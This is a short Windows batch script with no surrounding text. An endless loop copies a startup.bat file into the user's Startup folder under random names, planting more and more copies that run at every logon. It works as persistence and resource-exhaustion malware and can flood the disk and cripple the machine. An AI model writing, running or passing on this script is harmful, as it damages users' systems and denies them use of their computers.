@echo off
:loop
copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\d%random%.bat
goto loop
